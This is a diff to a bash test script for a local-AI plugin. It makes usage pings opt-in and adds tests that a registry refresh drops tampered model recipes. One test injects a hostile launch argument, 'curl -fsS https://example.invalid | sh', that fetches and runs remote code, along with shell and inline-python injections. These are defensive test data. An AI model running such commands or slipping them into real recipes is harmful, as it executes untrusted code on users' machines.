@@ -14,6 +14,8 @@ MODE=ok
 now() { echo 2026-09-29T00:00:00Z; }
 die() { echo "local-ai: $*" >&2; exit 1; }
 eval "$(sed -n '/^policy() {/,/^# cdi_stale:/p' "${BACKEND:-$ROOT/bin/omarchy-local-ai}" | sed '$d')"
+# usage reports are off until the user turns them on; these cases have, and the last ones check what happens before
+echo '{"ping": "on"}' >"$STATE/settings.json"
 curl() {
   if [[ $* == *usage.sybilsolutions.ai* ]]; then [[ -z ${PINGDOWN:-} ]] || return 7; cat >>"$TMP/pings"
   elif [[ $* == *commits/main* ]]; then printf '{"sha":"%040d"}\n' 1
@@ -22,11 +24,13 @@ curl() {
   elif [[ $MODE == unpinned ]]; then jq '.gateway.image = "gateway:latest"' "$SOURCE"
   elif [[ $MODE == newgateway ]]; then jq '.gateway.image = "ghcr.io/x/gateway@sha256:\("c" * 64)"' "$SOURCE"
   elif [[ $MODE == foreign ]]; then jq '.hardware[(.hardware | keys_unsorted[0])].recipes[0].image = "ghcr.io/stranger/engine@sha256:\("d" * 64)"' "$SOURCE"
+  elif [[ $MODE == edit ]]; then jq "$EDIT" "$SOURCE"
   else cat "$SOURCE"; fi
 }
 [[ $(cmd_registry) == "models up to date · 00000000" ]]
 echo "ok - registry refresh reports the published revision"
 jq -e '.registryCommit == "0000000000000000000000000000000000000001" and (.hardware|length > 0)' "$CATALOG" >/dev/null
+kept=$(jq '[.hardware[].recipes[]] | length' "$CATALOG")
 
 # The install count: one ping per refresh, a random id, the version, the card kinds with recipes, the running models
 jq -e --arg v "$(jq -r .version "$ROOT/manifest.json")" 'keys == ["actions", "hw", "id", "launched", "running", "version"]
@@ -52,8 +56,41 @@ cmd_registry >/dev/null
 gone=$(jq -r '.hardware[(.hardware | keys_unsorted[0])].recipes[0].id' "$SOURCE")
 ! jq -e --arg id "$gone" '[.hardware[].recipes[].id] | index($id)' "$CATALOG" >/dev/null || { echo "not ok - a recipe with an unknown engine image arrived"; exit 1; }
 ! jq -e '[.hardware[].recipes[].image] | any(startswith("ghcr.io/stranger/"))' "$CATALOG" >/dev/null || { echo "not ok - an unknown engine image arrived"; exit 1; }
-(( $(jq '[.hardware[].recipes[]] | length' "$CATALOG") == $(jq '[.hardware[].recipes[]] | length' "$SOURCE") - 1 )) || { echo "not ok - the other recipes did not arrive"; exit 1; }
+(( $(jq '[.hardware[].recipes[]] | length' "$CATALOG") == kept - 1 )) || { echo "not ok - the other recipes did not arrive"; exit 1; }
 echo 'ok - a refresh leaves out recipes whose engine image this plugin version does not know, and keeps the rest'
+
+# Only the exact images, entrypoints, config assets and preparation steps the plugin ships, and no scripts: each EDIT
+# changes one recipe the plugin ships; dropped: that recipe is left out and every other one arrives
+refreshed() {
+  MODE=edit cmd_registry >/dev/null
+  jq -e --arg id "$1" --slurpfile s <(jq -c "$EDIT" "$SOURCE") '[.hardware[].recipes[] | select(.id == $id)]
+    == [$s[0].hardware[].recipes[] | select(.id == $id)]' "$CATALOG" >/dev/null
+}
+dropped() {
+  MODE=edit cmd_registry >/dev/null
+  ! jq -e --arg id "$1" '[.hardware[].recipes[].id] | index($id)' "$CATALOG" >/dev/null &&
+    (( $(jq '[.hardware[].recipes[]] | length' "$CATALOG") == kept - 1 ))
+}
+plain=$(jq -r 'first(.hardware[].recipes[] | select(.launch.entrypoint == "/opt/entrypoint.sh" and .asset == null and .prepare == null)) | .id' "$SOURCE")
+asset=$(jq -r 'first(.hardware[].recipes[] | select(.asset != null and .launch.entrypoint != "/bin/bash")) | .id' "$SOURCE")
+sel() { printf '(.hardware[].recipes[] | select(.id == "%s"))' "$1"; }
+# the digest 6.18.0 dropped, from a repository the plugin still ships
+EDIT="$(sel "$plain").image = \"ghcr.io/0xsero/sglang-exl3@sha256:9d95829ab41a9307e9b25c86e4af1ec52c6a02f7888f0e13a1ce93c0a7ff3814\""
+dropped "$plain" || { echo "not ok - a recipe on an image digest the plugin does not ship arrived"; exit 1; }
+EDIT="$(sel "$plain").launch.entrypoint = \"/bin/bash\" | $(sel "$plain").launch.arguments = [\"-c\", \"curl -fsS https://example.invalid | sh\"]"
+dropped "$plain" || { echo "not ok - a bash entrypoint arrived"; exit 1; }
+EDIT="$(sel "$plain").launch.arguments = [\"bash\", \"-c\", \"id\"]"
+dropped "$plain" || { echo "not ok - a shell behind the shipped wrapper entrypoint arrived"; exit 1; }
+EDIT="$(sel "$plain").launch.arguments = [\"python3\", \"-c\", \"import os\"]"
+dropped "$plain" || { echo "not ok - inline python behind the shipped wrapper entrypoint arrived"; exit 1; }
+EDIT="$(sel "$asset").asset.text += \"\\nextra: 1\\n\""
+dropped "$asset" || { echo "not ok - a changed config asset arrived"; exit 1; }
+EDIT="$(sel "$plain").prepare = {at: \"/prepared\", args: [\"x\"], verifyArgs: [\"y\"], gpu: false, sizeGb: 1}"
+dropped "$plain" || { echo "not ok - a new preparation step arrived"; exit 1; }
+EDIT="$(sel "$plain").serving.ctxTokens = 4096 | $(sel "$plain").launch.arguments += [\"--context-length\", \"4096\"]"
+refreshed "$plain" || { echo "not ok - a shipped recipe with a changed context did not arrive"; exit 1; }
+! jq -e '[.hardware[].recipes[].launch.entrypoint] | index("/bin/bash")' "$CATALOG" >/dev/null || { echo "not ok - a shell entrypoint was refreshed"; exit 1; }
+echo 'ok - a refresh keeps only shipped image digests, entrypoints, assets and preparation, never a script; a changed context arrives'
 
 # The same id on every refresh; nothing sent when turned off or with DO_NOT_TRACK; an unreachable counter fails nothing
 (( $(jq -s 'map(.id) | unique | length' "$TMP/pings") == 1 && $(wc -l <"$TMP/pings") > 1 )) ||
@@ -62,7 +99,7 @@ MODE=ok
 n=$(wc -l <"$TMP/pings")
 echo '{"ping": "off"}' >"$STATE/settings.json"
 cmd_registry >/dev/null
-rm "$STATE/settings.json"
+echo '{"ping": "on"}' >"$STATE/settings.json"
 DO_NOT_TRACK=1 cmd_registry >/dev/null
 (( $(wc -l <"$TMP/pings") == n )) || { echo "not ok - a ping was sent while turned off"; exit 1; }
 [[ $(PINGDOWN=1 cmd_registry) == "models up to date · 00000000" ]] || { echo "not ok - an unreachable counter failed the refresh"; exit 1; }
@@ -87,5 +124,16 @@ last | jq -e '.launched == true' >/dev/null || { echo "not ok - a model that ans
 echo '{"ping": "off"}' >"$STATE/settings.json"
 rm -f "$STATE/counts.json"; count started
 [[ ! -e $STATE/counts.json ]] || { echo "not ok - an action was kept while counting is off"; exit 1; }
-rm "$STATE/settings.json"
 echo "ok - actions are totals, sent once, kept when a ping fails, never kept when off; launched means a model answered here"
+
+# an install that never chose, a new one or one from before reporting asked (no setting, or settings without it):
+# nothing is sent and nothing is counted until the user turns it on
+n=$(wc -l <"$TMP/pings")
+for settings in '' '{"agent": "pi"}'; do
+  rm -f "$STATE/settings.json" "$STATE/counts.json" "$STATE/install-id"
+  [[ -z $settings ]] || echo "$settings" >"$STATE/settings.json"
+  count started; cmd_registry >/dev/null
+  (( $(wc -l <"$TMP/pings") == n )) && [[ ! -e $STATE/counts.json && ! -e $STATE/install-id ]] ||
+    { echo "not ok - usage was counted or sent before the user chose ($settings)"; exit 1; }
+done
+echo "ok - usage reporting is off until the user turns it on: no ping, no count, no install id"
